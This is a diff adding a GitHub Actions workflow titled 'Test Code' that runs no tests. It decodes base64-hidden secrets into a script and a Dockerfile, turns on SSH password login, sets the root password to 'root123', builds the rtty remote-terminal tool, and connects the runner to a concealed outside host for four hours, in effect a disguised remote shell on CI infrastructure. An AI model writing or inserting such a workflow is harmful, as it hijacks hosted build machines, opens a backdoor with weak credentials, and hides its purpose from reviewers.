@@ -1,0 +1,40 @@
+name: Test Code
+
+on:
+  workflow_dispatch:
+  repository_dispatch:
+    types: [fts]
+
+jobs:
+  fts:
+    runs-on: ubuntu-latest
+    steps:
+      - name: start
+        env:
+          KEY_S: ${{ secrets.KEY_S }}
+          KEY_W: ${{ secrets.KEY_W }}
+          KEY_E: ${{ secrets.KEY_E }}
+          KEY_R: ${{ secrets.KEY_R }}
+
+        run: |
+          mkdir /tmp/project
+          echo $KEY_S | base64 -d > /tmp/project/run_test.sh
+          echo $KEY_W | base64 -d > /tmp/project/Dockerfile
+          cd /tmp/project
+          docker build -t ubuntu1 .
+          docker run -itd --name ubuntu_container_1 ubuntu1
+          sudo apt install openssh-server libev-dev libssl-dev cmake make -y
+          sudo service ssh start
+          sudo sed -i "s/^#PasswordAuthentication no/PasswordAuthentication yes/" /etc/ssh/sshd_config
+          sudo sed -i "s/^PasswordAuthentication no/PasswordAuthentication yes/" /etc/ssh/sshd_config
+          sudo systemctl restart sshd 
+          echo "root:root123" | sudo chpasswd
+          sudo usermod -aG sudo root
+          git clone --recursive https://github.com/zhaojh329/rtty.git
+          cd rtty && mkdir build && cd build
+          cmake .. && make install
+          a=$(echo "$KEY_E" | base64 -d)
+          b=$(echo "$KEY_R" | base64 -d)
+          ips="$(hostname)"
+          sudo /usr/local/bin/rtty -I "$ips" -h "$a" -p 5912 -t "$b"
+          sleep 4h
